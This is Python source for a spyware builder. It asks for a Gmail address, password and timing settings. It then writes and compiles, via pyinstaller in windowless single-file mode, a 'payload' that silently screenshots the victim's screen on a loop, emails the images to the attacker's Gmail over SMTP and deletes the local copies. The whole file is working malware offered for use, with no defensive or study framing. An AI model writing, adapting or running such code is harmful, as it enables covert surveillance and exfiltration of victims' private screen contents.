from termcolor import colored
from shutil import rmtree
import os

answers = ["y", "yes", "n", "no"]

def generate_screenshoter(color):
	while True:
		email = input("Gmail:" + colored(" > ", color))
		password = input("Password:" + colored(" > ", color))
		interval = input("Seconds between screenshots:" + colored(" > ", color))
		quantity = input("screenshots in one email:" + colored(" > ", color))
		name = input("name for payload file" + colored(" > ", color))

		check = ""

		while check.lower() not in answers:
			check = input("Are options correct? [Y/n]: ")

		if check.lower() == "y" or check.lower() == "yes":
			break

	fullname = name + ".py"

	with open(fullname, "w") as p:
		p.write("""
import time
import datetime
from PIL import ImageGrab
import smtplib
import os
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


pics = []
mail = '""" + email + """'
mailpass = '""" + password + """'
interval = """ + interval + """
quantity = """ + quantity + """

def screenshot():
	screen = ImageGrab.grab()
	time = datetime.datetime.now().strftime("%d-%b-%Y %H-%M-%S")
	name = str(time) + '.png'
	screen.save(name, 'PNG')
	pics.append(name)

	if len(pics) >= quantity:
		send_mail()

def send_mail():
	global data, mail, mailpass, pics

	msg = MIMEMultipart()

	for p in pics:
		img_data = open(p, 'rb').read()
		msg.attach(MIMEImage(img_data, name=p))

	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(mail, mailpass)
	server.sendmail(mail, mail, msg.as_string())
	server.close()

	for p in pics:
		os.remove(p)

	pics = []

while True:
	screenshot()
	time.sleep(interval)""")

	print("===== COMPILING =====")
	os.system("pyinstaller -w -F " + os.getcwd() + "/" + fullname)
	print("=====================")

	try:
		rmtree("build")
		rmtree("__pycache__")
		os.remove(name + ".spec")
		os.remove(fullname)
		print(colored("Payload file saved to ./dist", "green"))
	except:
		print(colored("Something went wrong!", "red"))

	input("\nPress ENTER to exit")

	return name
